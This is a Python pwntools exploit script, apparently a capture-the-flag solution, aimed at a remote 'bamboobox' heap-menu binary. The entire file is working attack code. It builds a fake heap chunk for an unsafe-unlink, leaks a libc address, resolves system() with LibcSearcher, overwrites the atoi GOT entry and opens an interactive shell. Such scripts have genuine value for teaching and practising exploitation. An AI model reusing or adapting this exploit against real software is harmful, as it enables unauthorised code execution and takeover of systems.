from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')
# io = process('./bamboobox')
io = remote('node4.buuoj.cn', 29414)
elf = ELF('./bamboobox')

def add(length, content):
    io.sendlineafter(b'Your choice:', b'2')
    io.sendlineafter(b'Please enter the length of item name:', str(length).encode())
    io.sendafter(b'Please enter the name of item:', content)

def show():
    io.sendlineafter(b'Your choice:', b'1')

def change(index, length, content):
    io.sendlineafter(b'Your choice:', b'3')
    io.sendlineafter(b'Please enter the index of item:', str(index).encode())
    io.sendlineafter(b'Please enter the length of item name:', str(length).encode())
    io.sendafter(b'Please enter the new name of the item:', content)

def delete(index):
    io.sendlineafter(b'Your choice:', b'4')
    io.sendlineafter(b'Please enter the index of item:', str(index).encode())

add(0x88, b'colin')     # chunk #0
add(0x88, b'colin')     # chunk #1
add(0x20, b'/bin/sh')   # chunk #2
payload = p64(0x10)
payload += p64(0x81)
payload += p64(0x6020C8 - 0x18)
payload += p64(0x6020C8 - 0x10)
payload += cyclic(0x60)
payload += p64(0x80)
payload += p64(0x90)
change(0, 0x90, payload)
delete(1)
show()
io.recv(4)
stdin = u64(io.recv(6) + b'\x00\x00')
print(hex(stdin))
libc = LibcSearcher('_IO_2_1_stdin_', stdin)
base = stdin - libc.dump('_IO_2_1_stdin_')
sys = base + libc.dump('system')
change(0, 0x20, p64(stdin) + p64(0) + p64(0x88) + p64(elf.got['atoi']))
change(0, 0x8, p64(sys))
io.sendline(b'/bin/sh')
io.interactive()
